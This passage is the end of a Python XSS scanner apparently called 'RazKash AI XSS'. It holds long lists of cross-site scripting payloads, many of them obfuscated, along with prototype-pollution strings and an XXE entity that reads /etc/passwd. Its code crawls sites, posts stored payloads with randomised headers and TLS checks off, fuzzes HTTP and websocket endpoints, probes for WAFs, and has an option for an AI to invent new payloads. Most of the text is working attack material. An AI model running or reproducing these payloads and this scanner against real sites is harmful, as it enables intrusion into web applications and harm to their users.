    "<div style=\"width: expression(alert('XSS'))\">",
    '<style>body:after { content:"XSS"; }</style>',
    "<style onload=alert(\"XSS\")></style>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
    "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
    "<style>@keyframes xss { from {color: red;} to {color: green;} } div { animation: xss 5s infinite; }</style>",
    "<meta charset=\"x-unknown\" content=\"javascript:alert('XSS')\">",

    # 61–70: Event Handlers & Rare Tags
    "<img src=x onmouseover=alert('XSS')>",
    "<marquee onstart=alert('XSS')>Scrolling Text</marquee>",
    "<table background=\"javascript:alert('XSS')\"><tr><td>XSS!</td></tr></table>",
    "<audio src onerror=alert('XSS')></audio>",
    "<video src onerror=confirm('XSS')></video>",
    "<object data=\"javascript:alert('XSS')\"></object>",
    "<embed src=\"javascript:alert('XSS')\"></embed>",
    "<applet code=javascript:alert('XSS')></applet>",
    "<details ontoggle=alert('XSS')>Click to toggle</details>",
    "<textarea autofocus onfocus=alert(\"XSS\")>Focus me</textarea>",

    # 71–80: Attribute Escapes
    "\" autofocus onfocus=alert('XSS') foo=\"",
    "' onmouseover=alert(\"XSS\") '",
    "<!--\"><script>alert('XSS')</script>",
    "-->\"><script>alert('XSS')</script>",
    "<!--#exec cmd=\"/bin/echo '<script>alert(XSS)</script>'\"-->",
    "<title onpropertychange=alert('XSS')>TitleXSS</title>",
    "<blink onclick=alert(\"XSS\")>Blink me</blink>",
    "\"--><script>alert('XSS')</script><!--\"",
    "'-->\"><img src=x onerror=alert(\"XSS\")>",
    "--><svg/onload=alert('XSS')><!",

    # 81–90: javascript: / data URIs
    "javascript:alert(\"XSS\")",
    "JaVaScRiPt:alert(\"XSS\")",
    "data:text/html,<script>alert(\"XSS\")</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "\"><iframe srcdoc=\"data:text/html,<script>alert('XSS')</script>\"></iframe>",
    "\"><script>window.location='javascript:alert(\"XSS\")'</script>",
    "<a href=\"data:text/html;charset=utf-8,<script>alert(1)</script>\">Data Link</a>",
    "<img src=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+>",
    "\"><object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
    "<video src=\"data:video/mp4;base64,invalid\" onerror=\"alert('XSS')\"></video>",

    # 91–100: Obfuscated
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "\"><script>alert(unescape('%58%53%53'))</script>",
    "<script>eval(\"&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;\")</script>",
    "<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>",
    "<iframe srcdoc=\"%3Cscript%3Ealert('XSS')%3C%2Fscript%3E\"></iframe>",
    "\"><img src=x oneRrOr=eval('al'+'ert(1)')>",
    "<img src=x onerror=\"this['al'+'ert']('XSS')\">",
    "<svg onload='fetch(\"data:,\"+String.fromCharCode(97,108,101,114,116,40,49,41))'></svg>",
    "<style>*{background-image:url(\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\")} </style>",
    "<img src=1 onerror='eval(decodeURIComponent(\"%61%6c%65%72%74%28%31%29\"))'>",
  
    "__proto__[alert]=1",
    '{"__proto__":{"polluted":"yes"}}',
    "constructor.constructor('alert(1)')()",
    "Object.prototype.__defineGetter__('x',function(){alert(1)})",
    '__proto__.toString="alert(1)"'
]
    
BASE_PAYLOADS = [
    "__proto__[alert]=1",
    '{"__proto__":{"polluted":"yes"}}',
    "constructor.constructor('alert(1)')()",
    "Object.prototype.__defineGetter__('x',function(){alert(1)})",
    '__proto__.toString="alert(1)"',
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')" />',
    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
    '"><script>alert("XSS")</script>',
    '"><img src=x onerror=alert("XSS")>',
    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
    'javascript:alert("XSS")',
    'javascript:confirm("XSS")',
    'javascript:eval("alert(\'XSS\')")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
    '<img src=x onerror=confirm("XSS")>',
    '<img src=x onerror=eval("alert(\'XSS\')")>',
    '\'; alert(String.fromCharCode(88,83,83))//',
    '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
    '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
    '<img foo=a src="javascript:alert(\'XSS\')">',
    '<img foo=a onerror="alert(\'XSS\')">',
    '<img src="http://example.com/image.jpg">',
    '<img src="">',
    '<img>',
    '<img src=x onerror=alert("XSS")>',
    '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
    '&#34;><img src=x onerror=alert(\'XSS\')>',
    '&#34><img src=x onerror=alert(\'XSS\')>',
    '&#x22><img src=x onerror=alert(\'XSS\')>',
    '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
    '<img src="vbscript:alert(\'XSS\')">',
    '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
    '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
    '<BODY ONLOAD=alert(\'XSS\')>',
    '<img onmouseover="alert(\'XSS\')" src="x">',
    '<s<Sc<script>ript>alert(\'XSS\')</script>',
    '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
    '<TD BACKGROUND="javascript:alert(\'XSS\')">',
    '<DIV STYLE="width: expression(alert(\'XSS\'));">',
    '<BASE HREF="javascript:alert(\'XSS\');//">',
    '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
    '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
    '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
    '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
]
if args.invent:
    # Let the AI fill in 'MASK'
    BASE_PAYLOADS.append('MASK')

PAYLOADS = BASE_PAYLOADS.copy()

def main():
    mode="all"
    if args.reflected:
        mode="reflected"
    elif args.stored:
        mode="stored"
    elif args.blind:
        mode="blind"

    if args.autotest:
        roots=[smart_url(u) for u in AUTOTEST]
    elif args.url:
        roots=[smart_url(args.url)]
    else:
        ap.print_help()
        sys.exit(1)

    logging.info(f"\n┌─ RazKash AI XSS v{VER}")

    if args.detect_waf:
        for r in roots:
            w=detect_waf(r)
            logging.info(f"│   WAF on {r}: {w}")

    for root in roots:
        logging.info(f"├─▶ {root}")
        static_targets=crawl_static(root,args.max_pages,depth=1)
        dynamic_targets=crawl_dynamic(root)

        # GraphQL check
        if "graphql" in root.lower():
            fuzz_graphql(root)

        all_targets=static_targets+dynamic_targets

        if mode=="stored":
            # Attempt storing with each payload from stored_payloads
            for t in static_targets:
                if t["method"] in ("POST","PUT") and not t.get("json",False):
                    for pay in stored_payloads:
                        try:
                            SESSION.post(
                                t["url"],
                                data={p: pay for p in t["params"]},
                                headers=random_headers(),
                                timeout=HTTP_TIMEOUT, verify=False
                            )
                            # Then check
                            if verify(t["url"],"GET",{},False):
                                log_hit(t["url"],"STORED",pay,t["params"])
                        except Exception as e:
                            dbg(f"[stored] {e}")

        elif mode in ("blind","reflected","all"):
            http_targets=[x for x in all_targets if not x["url"].startswith(("ws://","wss://"))]
            ws_targets=[x for x in all_targets if x["url"].startswith(("ws://","wss://"))]

            with ThreadPoolExecutor(max_workers=args.threads) as pool:
                pool.map(fuzz_http, http_targets)
                pool.map(fuzz_ws, ws_targets)

    logging.info(f"└─ Findings saved → {LOGFILE.resolve()}\n")

if __name__=="__main__":
    main()
